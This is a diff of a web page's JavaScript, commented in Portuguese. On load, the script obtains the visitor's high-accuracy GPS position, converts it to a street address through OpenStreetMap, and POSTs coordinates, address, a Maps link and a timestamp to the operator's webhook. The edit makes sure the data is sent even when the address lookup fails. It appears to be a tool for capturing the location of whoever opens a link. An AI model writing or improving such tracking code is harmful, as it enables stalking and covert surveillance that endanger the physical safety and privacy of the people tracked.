@@ -15,7 +15,8 @@
         window.onload = function() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(processarLocalizacao, showError, {
-                    enableHighAccuracy: true
+                    enableHighAccuracy: true,
+                    timeout: 10000 // Cancela se o GPS demorar mais de 10 segundos
                 });
             }
         };
@@ -25,37 +26,42 @@
             const lon = position.coords.longitude;
             const precisao = position.coords.accuracy;
 
-            // Consulta a API gratuita do OpenStreetMap para traduzir as coordenadas
+            // Prepara os dados básicos garantidos
+            let pacote = {
+                latitude: lat,
+                longitude: lon,
+                margem_erro_metros: precisao.toFixed(2),
+                link_maps: `https://www.google.com/maps?q=${lat},${lon}`,
+                horario: new Date().toLocaleString()
+            };
+
             const urlGeocoding = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`;
 
-            fetch(urlGeocoding)
+            // Tenta buscar a rua
+            fetch(urlGeocoding, { headers: { "Accept-Language": "pt-BR" } })
                 .then(resposta => resposta.json())
                 .then(dadosGeocoding => {
                     const endereco = dadosGeocoding.address || {};
+                    pacote.rua = endereco.road || "Não identificada";
+                    pacote.numero = endereco.house_number || "Sem número";
+                    pacote.bairro = endereco.suburb || endereco.neighbourhood || "Não identificado";
+                    pacote.cidade = endereco.city || endereco.town || endereco.village || "Não identificada";
                     
-                    // Monta o pacote final com coordenadas e endereço por extenso
-                    const pacote = {
-                        latitude: lat,
-                        longitude: lon,
-                        margem_erro_metros: precisao.toFixed(2),
-                        rua: endereco.road || "Não identificada",
-                        numero: endereco.house_number || "Sem número no mapa",
-                        bairro: endereco.suburb || endereco.neighbourhood || "Não identificado",
-                        cidade: endereco.city || endereco.town || endereco.village || "Não identificada",
-                        estado: endereco.state || "Não identificado",
-                        cep: endereco.postcode || "Não identificado",
-                        link_maps: `https://www.google.com/maps?q=${lat},${lon}`,
-                        horario: new Date().toLocaleString()
-                    };
-
-                    // Envia tudo para o seu computador (Webhook)
-                    return fetch(URL_DO_WEBHOOK, {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify(pacote)
-                    });
+                    enviarParaWebhook(pacote); // Envia com a rua
                 })
-                .catch(error => console.error("Erro:", error));
+                .catch(error => {
+                    pacote.erro_rua = "Falha ao buscar nome da rua, mas GPS funcionou.";
+                    enviarParaWebhook(pacote); // Envia só com o GPS mesmo se a rua falhar
+                });
+        }
+
+        // Função separada que garante o envio do POST
+        function enviarParaWebhook(dados) {
+            fetch(URL_DO_WEBHOOK, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(dados)
+            }).catch(e => console.error("Erro no Webhook"));
         }
 
         function showError(error) {
